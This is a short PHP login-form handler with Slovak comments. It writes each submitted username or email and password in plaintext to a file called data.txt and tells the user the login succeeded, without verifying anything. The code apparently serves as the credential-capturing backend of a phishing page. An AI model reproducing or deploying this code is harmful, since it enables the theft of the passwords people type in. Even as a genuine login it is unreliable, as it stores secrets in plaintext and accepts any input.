<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['prihlas'])) {
    $filename = "data.txt";
    $usernameOrEmail = $_POST['pouzmenoemail'];
    $password = $_POST['heslo'];

    // Ukladanie do súboru
    file_put_contents($filename, "Prihlásenie: $usernameOrEmail, $password\n", FILE_APPEND);

    // Presmerovanie alebo zobrazenie správy
    echo "Prihlásenie bolo úspešné.";
    // header('Location: success.php'); // Presmerovanie na úspešnú stránku
    exit;
}
?>